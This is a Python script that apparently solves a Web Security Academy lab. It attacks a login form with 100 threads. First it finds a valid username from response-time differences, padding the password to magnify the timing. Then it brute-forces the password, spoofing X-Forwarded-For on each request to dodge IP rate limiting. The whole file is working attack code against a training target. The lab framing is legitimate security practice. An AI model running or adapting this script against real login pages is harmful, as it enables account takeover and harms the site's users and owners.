import requests
from concurrent.futures import ThreadPoolExecutor

url = 'https://acfa1fe71f79d8fbc0a926240026009a.web-security-academy.net/login'
delay = {}

def get_username(data, headers):
    return (data['username'], requests.post(url, data = data, headers = headers).elapsed.microseconds)

def get_password(data, headers):
    return (data['password'], 'Log out' in requests.post(url, data = data, headers = headers).text)

with ThreadPoolExecutor(max_workers=100) as pool:
    usernames = open('username.txt', 'r').readlines()
    passwords = open('password.txt', 'r').readlines()

    id = 700
    data = []
    headers = []
    
    for user in usernames:
        id += 1
        data.append({'username' : user.strip(), 'password' : 'peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter'})
        headers.append({'X-Forwarded-For' : str(id)})
    
    delay = dict(list(pool.map(get_username, data, headers)))
    
    username = str(max(delay, key=delay.get))
    print(username)
    
    data = []
    headers = []
    
    for passwd in passwords:
        id += 1
        data.append({'username' : username.strip(), 'password' : passwd.strip()})
        headers.append({'X-Forwarded-For' : str(id)})
        
    result = dict(list(pool.map(get_password, data, headers)))
    password = list(result.keys())[list(result.values()).index(True)]
    print(password)